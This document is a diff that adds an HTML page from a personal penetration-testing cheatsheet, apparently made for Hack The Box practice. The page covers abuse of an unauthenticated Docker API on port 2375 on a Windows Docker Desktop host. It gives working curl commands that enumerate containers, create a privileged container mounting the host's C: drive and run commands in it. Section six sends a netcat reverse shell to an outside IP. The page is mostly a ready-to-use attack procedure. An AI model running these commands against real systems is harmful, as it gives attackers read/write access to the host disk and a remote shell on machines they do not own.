@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Docker API Abuse — Windows Reference</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<div class="layout">
+  <aside>
+    <div class="brand"><a href="../index.html" style="color:inherit">HTB::refs</a><small>personal cheatsheet</small></div>
+    <nav>
+      <h4>Index</h4>
+      <ul><li><a href="../index.html">Home</a></li></ul>
+      <h4>Linux</h4>
+      <ul>
+        <li><a href="../linux/index.html">Overview</a></li>
+        <li><a href="../linux/ffuf.html">ffuf</a></li>
+        <li><a href="../linux/gobuster.html">gobuster</a></li>
+        <li><a href="../linux/exploits.html">Exploits</a></li>
+      </ul>
+      <h4>Windows</h4>
+      <ul>
+        <li><a href="index.html">Overview</a></li>
+        <li><a href="docker-api.html" class="active">Docker API Abuse</a></li>
+        <li><a href="post-exploitation.html">Post-Exploitation</a></li>
+      </ul>
+    </nav>
+  </aside>
+
+  <main>
+    <h1>Docker API Abuse <span class="tag">:2375 · Windows host</span></h1>
+    <p class="lead">Docker Desktop on Windows can expose the Docker daemon on <span class="inline">2375/tcp</span> without TLS. From a pivot container, that means full RCE on the host.</p>
+
+    <h2>1. Detect the API</h2>
+<pre><code># Inside the container
+curl http://192.168.65.7:2375/version</code></pre>
+
+    <div class="note">Docker Desktop for Windows uses <span class="inline">192.168.65.0/24</span> (or similar) for its internal bridge. Confirm the address via <span class="inline">ss -tulpn</span> / routing table inside the container.</div>
+
+    <h2>2. List running containers (intel)</h2>
+<pre><code>curl http://192.168.65.7:2375/containers/json</code></pre>
+    <p>Inspect labels — Docker Compose leaks the project path:</p>
+<pre><code>"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"</code></pre>
+
+    <h2>3. Create a privileged container bound to C:\</h2>
+<pre><code>curl -X POST -H "Content-Type: application/json" \
+  http://192.168.65.7:2375/containers/create?name=pwned \
+  -d '{
+    "Image": "alpine:latest",
+    "Cmd": ["sleep", "infinity"],
+    "HostConfig": {
+      "Privileged": true,
+      "Binds": ["/mnt/host/c/:/mnt/windows"]
+    }
+  }'</code></pre>
+
+    <div class="warn">
+      <strong>Key trick:</strong> Docker Desktop exposes the Windows <span class="inline">C:\</span> drive as <span class="inline">/mnt/host/c/</span> inside its VM. Binding it to <span class="inline">/mnt/windows</span> inside our container = read/write the whole host disk.
+    </div>
+
+    <p>Expected response:</p>
+<pre><code>{"Id":"cfd1c32e3ec042b0bc9aa5a31af2ba4d47e2324131c351d6faa295ed57133a95","Warnings":[]}</code></pre>
+
+    <h2>4. Start the container</h2>
+<pre><code>curl -X POST http://192.168.65.7:2375/containers/pwned/start</code></pre>
+
+    <h2>5. Exec a command inside it</h2>
+<pre><code>curl -X POST -H "Content-Type: application/json" \
+  http://192.168.65.7:2375/containers/pwned/exec \
+  -d '{
+    "Cmd": ["ls", "-la", "/mnt/windows/Users"],
+    "AttachStdout": true,
+    "AttachStderr": true
+  }'</code></pre>
+
+    <p>This returns an exec <span class="inline">Id</span>; actually run it with:</p>
+<pre><code>curl -X POST -H "Content-Type: application/json" \
+  http://192.168.65.7:2375/exec/&lt;EXEC_ID&gt;/start \
+  -d '{"Detach": false, "Tty": false}'</code></pre>
+
+    <h2>6. One-shot reverse shell</h2>
+<pre><code>EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
+  http://192.168.65.7:2375/containers/pwned/exec \
+  -d '{"Cmd": ["nc", "10.10.15.57", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
+  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+
+curl -X POST -H "Content-Type: application/json" \
+  "http://192.168.65.7:2375/exec/$EXEC_ID/start" \
+  -d '{"Detach": false, "Tty": false}' --no-buffer &</code></pre>
+
+    <h2>Endpoint cheatsheet</h2>
+    <table>
+      <thead><tr><th>Endpoint</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td><span class="inline">GET /version</span></td><td>Daemon info — confirms API reachable.</td></tr>
+        <tr><td><span class="inline">GET /containers/json</span></td><td>List running containers.</td></tr>
+        <tr><td><span class="inline">GET /containers/json?all=1</span></td><td>List all containers (stopped included).</td></tr>
+        <tr><td><span class="inline">GET /images/json</span></td><td>List local images (pick one you can reuse).</td></tr>
+        <tr><td><span class="inline">POST /containers/create</span></td><td>Create a new container (JSON body).</td></tr>
+        <tr><td><span class="inline">POST /containers/&lt;id&gt;/start</span></td><td>Start it.</td></tr>
+        <tr><td><span class="inline">POST /containers/&lt;id&gt;/exec</span></td><td>Prepare an exec instance.</td></tr>
+        <tr><td><span class="inline">POST /exec/&lt;id&gt;/start</span></td><td>Run the prepared exec.</td></tr>
+      </tbody>
+    </table>
+
+    <footer><a href="index.html">← back to Windows</a></footer>
+  </main>
+</div>
+</body>
+</html>
